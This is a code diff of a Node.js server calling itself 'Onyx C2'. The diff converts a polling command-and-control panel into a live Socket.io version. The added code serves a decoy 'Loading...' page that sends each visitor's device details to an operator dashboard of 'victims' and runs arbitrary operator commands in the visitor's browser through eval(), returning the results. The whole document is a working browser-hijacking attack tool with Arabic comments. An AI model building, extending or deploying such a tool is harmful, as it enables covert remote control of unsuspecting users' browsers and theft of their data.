@@ -1,96 +1,154 @@
 const express = require('express');
+const http = require('http');
+const { Server } = require('socket.io');
+
 const app = express();
+const server = http.createServer(app);
+const io = new Server(server);
+
 const PORT = process.env.PORT || 3000;
 
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+// تخزين الأجهزة المتصلة
+let victims = {};
 
-// تخزين الجلسات والأوامر المعلقة
-let activeSessions = {};
-let commandQueue = {};
-
-// صفحة لوحة التحكم (Dashboard)
-app.get('/', (req, res) => {
-    let sessionsHtml = '';
-    
-    if (Object.keys(activeSessions).length > 0) {
-        for (let [sid, data] of Object.entries(activeSessions)) {
-            sessionsHtml += `
-                <div style="background: #1e293b; border: 1px solid #334155; padding: 15px; margin-bottom: 10px; border-radius: 8px;">
-                    <strong>معرف الجلسة:</strong> ${sid}<br>
-                    <strong>المنصة:</strong> ${data.platform}<br>
-                    <strong>المتصفح:</strong> ${data.userAgent}<br>
-                    <strong>الشاشة:</strong> ${data.screen}<br>
-                    <strong>الـ IP:</strong> ${data.ip}<br>
-                    <form action="/send_cmd" method="POST" style="margin-top: 10px;">
-                        <input type="hidden" name="session_id" value="${sid}">
-                        <input type="text" name="command" placeholder="اكتب الأمر هنا..." style="background: #334155; color: white; border: 1px solid #475569; padding: 8px; width: 70%; border-radius: 4px;">
-                        <button type="submit" style="background: #0284c7; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer;">تنفيذ الأمر</button>
-                    </form>
-                </div>
-            `;
-        }
-    } else {
-        sessionsHtml = '<p>لا توجد جلسات متصلة حالياً...</p>';
-    }
-
-    const html = `
+// صفحة لوحة التحكم الخاصة بك
+app.get('/dashboard', (req, res) => {
+    let html = `
     <!DOCTYPE html>
     <html lang="ar" dir="rtl">
     <head>
         <meta charset="UTF-8">
-        <title>Onyx C2 Dashboard - Node.js</title>
+        <title>Onyx Master Control, baby</title>
         <style>
-            body { background: #0f172a; color: #e2e8f0; font-family: monospace; padding: 20px; }
+            body { background: #0b0f19; color: #f8fafc; font-family: monospace; padding: 20px; }
             h1 { color: #38bdf8; }
+            .victim-card { background: #1e293b; border: 1px solid #334155; padding: 15px; margin-bottom: 15px; border-radius: 8px; }
+            input, button { background: #334155; color: white; border: 1px solid #475569; padding: 8px; border-radius: 4px; }
+            button { cursor: pointer; background: #0284c7; }
+            pre { background: #0f172a; padding: 10px; border-radius: 4px; overflow-x: auto; color: #4ade80; }
         </style>
     </head>
     <body>
-        <h1>Onyx Node Control Panel</h1>
-        <p>الأجهزة المتصلة حالياً:</p>
-        <div>${sessionsHtml}</div>
+        <h1>Onyx C2 - لوحة السيطرة</h1>
+        <div id="victims-list"></div>
+
+        <script src="/socket.io/socket.io.js"></script>
+        <script>
+            const socket = io();
+            socket.emit('register-admin');
+
+            socket.on('update-victims', (data) => {
+                const list = document.getElementById('victims-list');
+                list.innerHTML = '';
+                for (let id in data) {
+                    let v = data[id];
+                    list.innerHTML += \`
+                        <div class="victim-card">
+                            <strong>معرف الضحية:</strong> \${id}<br>
+                            <strong>الجهاز:</strong> \${v.userAgent}<br>
+                            <input type="text" id="cmd-\${id}" placeholder="اكتب الأمر (مثال: alert('Hacked') أو fetch...)" style="width: 70%;">
+                            <button onclick="sendCmd('\${id}')">تنفيذ على الجوال</button>
+                            <pre id="output-\\${id}">في انتظار الرد...</pre>
+                        </div>
+                    \`;
+                }
+            });
+
+            function sendCmd(id) {
+                const cmd = document.getElementById('cmd-' + id).value;
+                socket.emit('admin-command', { targetId: id, command: cmd });
+            }
+
+            socket.on('cmd-result', (data) => {
+                document.getElementById('output-' + data.id).innerText = data.result;
+            });
+        </script>
     </body>
     </html>
     `;
     res.send(html);
 });
 
-// نقطة استقبال الاتصال من الضحية
-app.all('/connect', (req, res) => {
-    const data = req.method === 'POST' ? req.body : req.query;
-    const sessionId = data.id || 'fdpk4'; // التقاط المعرف الافتراضي من السجلات
-    
-    activeSessions[sessionId] = {
-        platform: data.platform || 'Linux armv81',
-        userAgent: data.userAgent || 'SamsungBrowser',
-        screen: data.screen || '979x1748',
-        ip: req.headers['x-forwarded-for'] || req.socket.remote_addr
-    };
-    
-    console.log(`[+] ضحية جديدة دخلت وركبت الاتصال بنجاح [-] المعرف: ${sessionId}`);
-    res.json({ status: "success", session: sessionId });
+// الصفحة الوهمية التي تفتح عند الضحية
+app.get('/', (req, res) => {
+    res.send(`
+    <!DOCTYPE html>
+    <html lang="ar">
+    <head>
+        <meta charset="UTF-8">
+        <title>Loading...</title>
+    </head>
+    <body>
+        <h2>جاري التحميل، يرجى الانتظار...</h2>
+        <script src="/socket.io/socket.io.js"></script>
+        <script>
+            const socket = io();
+            
+            socket.on('connect', () => {
+                // إرسال معلومات جهاز الضحية بمجرد فتح الرابط
+                socket.emit('register-victim', {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen: window.screen.width + 'x' + window.screen.height
+                });
+            });
+
+            // استقبال الأوامر وتنفيذها داخل المتصفح وإرجاع النتيجة
+            socket.on('exec-command', async (cmd) => {
+                try {
+                    let res = eval(cmd); // تنفيذ الأمر برمجياً في المتصفح
+                    if (res instanceof Promise) res = await res;
+                    socket.emit('command-response', { result: String(res) });
+                } catch (err) {
+                    socket.emit('command-response', { result: "Error: " + err.message });
+                }
+            });
+        </script>
+    </body>
+    </html>
+    `);
 });
 
-// نقطة سحب الأوامر للعميل (Polling)
-app.get('/poll/:sessionId', (req, res) => {
-    const sessionId = req.params.sessionId;
-    const cmd = commandQueue[sessionId] || "";
-    if (commandQueue[sessionId]) {
-        delete commandQueue[sessionId]; // مسح الأمر بعد سحبه لتنفيذه مرة واحدة
+// إدارة الاتصالات الحية عبر الـ WebSocket
+io.on('connection', (socket) => {
+    socket.on('register-victim', (info) => {
+        victims[socket.id] = { ...info, socket: socket };
+        io.emit('update-victims', getVictimsData());
+        console.log(`[+] ضحية جديدة مرتبطة: ${socket.id}`);
+    });
+
+    socket.on('register-admin', () => {
+        socket.join('admins');
+        socket.emit('update-victims', getVictimsData());
+    });
+
+    socket.on('admin-command', (data) => {
+        const target = victims[data.targetId];
+        if (target) {
+            target.socket.emit('exec-command', data.command);
+            target.socket.once('command-response', (res) => {
+                io.to('admins').emit('cmd-result', { id: data.targetId, result: res.result });
+            });
+        }
+    });
+
+    socket.on('disconnect', () => {
+        if (victims[socket.id]) {
+            delete victims[socket.id];
+            io.emit('update-victims', getVictimsData());
+            console.log(`[-] انقطع اتصال الضحية: ${socket.id}`);
+        }
+    });
+});
+
+function getVictimsData() {
+    let clean = {};
+    for (let id in victims) {
+        clean[id] = { userAgent: victims[id].userAgent, platform: victims[id].platform };
     }
-    res.json({ command: cmd });
-});
+    return clean;
+}
 
-// إرسال الأمر من لوحة التحكم
-app.post('/send_cmd', (req, res) => {
-    const { session_id, command } = req.body;
-    if (session_id && command) {
-        commandQueue[session_id] = command;
-        console.log(`[*] تم جدولة الأمر للجلسة ${session_id}: ${command}`);
-    }
-    res.redirect('/');
-});
-
-app.listen(PORT, () => {
-    console.log(`[*] السيرفر يعمل على المنفذ ${PORT} يا ببي...`);
+server.listen(PORT, () => {
+    console.log(`[*] السيرفر شغال على البورت ${PORT} يا ببي...`);
 });
